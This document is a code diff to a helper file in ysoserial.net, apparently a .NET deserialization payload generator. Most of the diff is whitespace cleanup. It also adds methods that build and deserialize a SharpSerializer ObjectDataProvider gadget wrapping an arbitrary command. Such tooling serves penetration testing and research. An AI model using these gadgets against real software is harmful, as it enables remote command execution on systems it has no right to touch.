@@ -1,4 +1,5 @@
 ﻿using Newtonsoft.Json;
+using Polenter.Serialization;
 using System;
 using System.Globalization;
 using System.IO;
@@ -14,6 +15,7 @@ using System.Windows.Markup;
 using System.Xml;
 using System.Xml.Serialization;
 using YamlDotNet.Serialization;
+using ysoserial.Helpers.SharpSerializerHelpers;
 
 namespace ysoserial.Helpers
 {
@@ -150,16 +152,16 @@ namespace ysoserial.Helpers
             // knownTypes is used in DataContractJsonSerializer_test
 
             StringBuilder sb = new StringBuilder();
-            sb.Append("Object returned from:");            
-            if(XmlSerializer_test(myobj, type) != null)
+            sb.Append("Object returned from:");
+            if (XmlSerializer_test(myobj, type) != null)
             {
                 sb.AppendLine("XmlSerializer_test");
             }
-            if(DataContractSerializer_test(myobj, type) != null)
+            if (DataContractSerializer_test(myobj, type) != null)
             {
                 sb.AppendLine("DataContractSerializer_test");
             }
-            if(Xaml_test(myobj) != null)
+            if (Xaml_test(myobj) != null)
             {
                 sb.AppendLine("Xaml_test");
             }
@@ -214,7 +216,7 @@ namespace ysoserial.Helpers
                 return null;
             }
 
-            
+
         }
 
         public static object XmlSerializer_test(object myobj, Type type)
@@ -247,12 +249,12 @@ namespace ysoserial.Helpers
 
         public static object XMLSerializer_deserialize(string str, string type)
         {
-            return XMLSerializer_deserialize(str, type, "" , "");
+            return XMLSerializer_deserialize(str, type, "", "");
         }
 
         public static object XMLSerializer_deserialize(string str, string type, string rootElement, string typeAttributeName)
         {
-            object obj = null; 
+            object obj = null;
 
             if (!rootElement.Equals(""))
             {
@@ -271,7 +273,7 @@ namespace ysoserial.Helpers
                 var s = new XmlSerializer(Type.GetType(type));
                 obj = s.Deserialize(new XmlTextReader(new StringReader(str)));
             }
-            
+
             return obj;
         }
 
@@ -298,7 +300,7 @@ namespace ysoserial.Helpers
             // Finding the namespace tag prefix of "http://schemas.microsoft.com/2003/10/Serialization/"
             Regex tagPrefixSerializationRegex = new Regex(@"xmlns:([\w]+)\s*=\s*""http://schemas.microsoft.com/2003/10/Serialization/""", RegexOptions.IgnoreCase);
             Match tagPrefixSerializationMatch = tagPrefixSerializationRegex.Match(dirtymarshal);
-            if(tagPrefixSerializationMatch.Groups.Count > 1)
+            if (tagPrefixSerializationMatch.Groups.Count > 1)
             {
                 string tagPrefixSerialization = tagPrefixSerializationMatch.Groups[1].Value;
                 if (!string.IsNullOrEmpty(tagPrefixSerialization))
@@ -311,7 +313,7 @@ namespace ysoserial.Helpers
                         string factoryTypeFullString = matchFactoryType.Groups[0].Value;
                         string mainTypeTagPrefix = matchFactoryType.Groups[1].Value;
                         string mainTypeTagName = matchFactoryType.Groups[2].Value;
-                        if(!string.IsNullOrEmpty(mainTypeTagName) && !string.IsNullOrEmpty(mainTypeTagPrefix))
+                        if (!string.IsNullOrEmpty(mainTypeTagName) && !string.IsNullOrEmpty(mainTypeTagPrefix))
                         {
                             // start replacing the dirty bits!
 
@@ -339,15 +341,15 @@ namespace ysoserial.Helpers
                                 // we need this to make it standard
                                 result = XMLMinifier.XmlXSLTMinifier(dirtymarshal);
 
-                                result = "<" + rootTagName + " "+ typeAttributeName + @"=""" + objectType.AssemblyQualifiedName + @""">" + result + "</" + rootTagName + ">";
+                                result = "<" + rootTagName + " " + typeAttributeName + @"=""" + objectType.AssemblyQualifiedName + @""">" + result + "</" + rootTagName + ">";
                             }
 
                         }
                     }
-                        
+
                 }
             }
-            
+
             return result;
         }
 
@@ -395,7 +397,7 @@ namespace ysoserial.Helpers
         public static object DataContractSerializer_deserialize(string str, string type, string rootElement, string typeAttributeName)
         {
             object obj = null;
-            
+
             if (!rootElement.Equals(""))
             {
                 var xmlDoc = new XmlDocument();
@@ -755,7 +757,7 @@ namespace ysoserial.Helpers
         public static object DataContractJsonSerializer_test(object gadget, Type type, Type[] knownTypes)
         {
             return DataContractJsonSerializer_deserialize(DataContractJsonSerializer_serialize(gadget, type, knownTypes), type, knownTypes);
-        } 
+        }
 
         public static object DataContractJsonSerializer_deserialize(string str, string type, Type[] knownTypes)
         {
@@ -789,5 +791,27 @@ namespace ysoserial.Helpers
             return Encoding.Default.GetString(ms.ToArray());
         }
 
+        /// <summary>
+        /// Serializes a sharp serializer ObjectDataProvider gadget with a specified command to a byte array object.
+        /// </summary>
+        /// <param name="command">The command to include.</param>
+        /// <returns>The serialized object.</returns>
+        public static object SharpSerializer_ObjectDataProvider_Binary_Serialize(string command)
+        {
+            return SharpSerializerHelperMethods.GenerateSharpSerializerPayload(command);
+        }
+
+        /// <summary>
+        /// Deserializes a raw binary SharpSerializer payload object.
+        /// </summary>
+        /// <param name="serializedData">The raw serialized object.</param>
+        public static void SharpSerializer_ObjectDataProvider_Binary_Deserialize(object serializedData)
+        {
+            SharpSerializer serializer = new SharpSerializer(true);
+            using (MemoryStream memoryStream = new MemoryStream((byte[])serializedData))
+            {
+                serializer.Deserialize(memoryStream);
+            }
+        }
     }
 }
